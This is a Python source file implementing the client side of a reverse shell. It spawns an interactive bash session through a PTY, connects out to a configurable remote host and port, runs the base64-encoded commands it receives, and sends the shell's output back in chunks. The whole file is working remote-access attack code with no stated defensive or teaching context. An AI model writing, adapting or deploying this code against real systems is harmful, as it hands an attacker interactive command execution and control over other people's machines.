import base64
import socket
import threading
import subprocess
from queue import Queue, Empty

from datetime import datetime
from network.NetworkError import NetworkError
from network.vp_protocol.b64_send import b64_send
from network.vp_protocol.b64_recv import b64_recv
import readline


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.output_queue = Queue()
        self.sending_queue = Queue()

    def run(self):
        process = subprocess.Popen(args=['python', '-c',
                                         'import pty; pty.spawn("/bin/bash")'],
                                   stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   shell=False,
                                   bufsize=-1)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            try:
                conn.connect((self.host, self.port))
            except ConnectionError as e:
                raise NetworkError(message=f"{e}")
            threading.Thread(target=self.read_thread, args=(process,),
                             daemon=True).start()
            threading.Thread(target=self.sending_thread, args=(process, conn,),
                             daemon=True).start()
            threading.Thread(target=self.output_thread, args=(conn,),
                             daemon=True).start()
            while True:
                message = b64_recv(conn=conn)
                if not message:
                    break
                else:
                    process.stdin.write(message.encode() + b'\n')
                    process.stdin.flush()

    def read_thread(self, process):
        for line in process.stdout:
            self.output_queue.put(line.decode().strip())

    def sending_thread(self, process, conn):
        while True:
            output = self.sending_queue.get()
            b64_send(message_str=output, conn=conn)

    def output_thread(self, conn):
        buffer = ''
        while True:
            output = self.output_queue.get()
            buffer += f"{output}\n"
            if self.output_queue.empty():
                while buffer:
                    if len(buffer) > 4096:
                        self.sending_queue.put(buffer[:4096])
                        buffer = buffer[4096:]
                    else:
                        try:
                            self.sending_queue.put(buffer)
                        except NetworkError as e:
                            print(f"[!] Connection error {e}")
                            quit()
                        else:
                            buffer = ''
